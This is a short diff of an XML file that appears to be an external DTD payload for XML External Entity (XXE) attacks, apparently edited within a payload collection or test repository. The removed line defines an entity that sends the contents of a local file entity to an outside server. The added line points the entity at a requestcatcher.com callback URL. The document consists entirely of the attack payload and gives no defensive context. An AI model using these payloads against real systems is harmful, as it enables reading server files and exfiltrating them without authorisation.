@@ -1,2 +1,2 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://myserver/?%file;'>"> %all;
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://e.requestcatcher.com/test'>"> %all;
